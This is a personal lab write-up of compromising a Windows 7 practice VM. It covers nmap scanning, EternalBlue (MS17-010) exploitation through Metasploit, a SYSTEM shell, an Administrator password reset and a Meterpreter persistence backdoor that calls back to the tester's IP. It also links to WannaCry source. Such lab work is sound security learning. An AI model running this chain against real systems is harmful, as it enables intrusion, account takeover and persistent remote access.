# Blue Box: My Try

## Part 0:

-   `sudo su`

## Part 1: Find IP of the Blue Box

1. `ifconfig`
    - my ip is 192.168.110.131
2. search in my own subnet -> `nmap -sP 192.168.110.1/24`
    - five IP's
        - 192.168.110.1 -> should probably the VMware NAT IP address
        - 192.168.110.2 -> should probably the VMware NAT IP address
        - 192.168.110.131 -> my own
        - 192.168.110.135 -> possible IP
        - 192.168.110.254 -> possible IP
3. `nmap -sV 192.168.110.135 192.168.110.254`
    - windows ports are available in 192.168.110.135 -> the target IP
4. `nmap -sV -p- -O --open -A 192.168.110.135`
    - -p- -> all ports deep scan
    - -O -> show OS also
    - --open -> show only accessible ports
    - -A -> all possible info
    - Observations
        - OS : Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
        - 445 port open (SMB)
        - smb2-security-mode: 2.1

## Part 2: Find Vulnerabilities

1. find vulnerabilities -> `nmap --script vuln 192.168.110.135`
    ```
    smb-vuln-ms17-010:
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
    ```
2. vulnerability found -> google it -> found [this link](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)

3. metasploit
    - `msfconsole`
    - `use exploit/windows/smb/ms17_010_eternalblue`
    - `show info`
        - Thanks a lot to Equation Group, Shadow Brokers and all the amazing minds that provided us with this exploit
    - `show options`
    - `set RHOSTS 192.168.110.135`
    - check RPORT is 445 -> the SMB port of the target
    - checked LHOSTS is my IP and LPORT is above 3000
    - `run` (uses auxiliary/scanner/smb/smb_ms17_010 as check)

## Part 3: Inside

1. `shell` -> open cmd in the target computer
2. `whoami` -> "nt authority\system" -> admin in simple language
3. `net user Administrator hello123` -> change password of the admin -> now you can login from the windows using the `hello123` as password

## Part 4: Meterpreter Backdoor
[Guide link](https://www.hackers-arise.com/how-to-make-the-meterpreter-persistent)

1. `exit` -> exit from windows shell to meterpreter
2. `run persistence -A -L c:\\ -X -i 30 -p 443 -r 192.168.110.131`
3. `background` -> set current meterpreter session to background
4. `show sessions` -> you will see two sessions now -> one is your and one is persistent 
5. go back to your session (in port 4444) -> `session <id>`
6. `exit` the session 
7. now go to the backdoor session

## More possible stuffs
-   Patch the vulnerability -> update windows [(source)](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
-   Ransomware -> found wannacry live code but didn't cause I am sacred it might leak into the network and screw up actual laptop [(source)](https://github.com/chronosmiki/RANSOMWARE-WANNACRY-2.0)


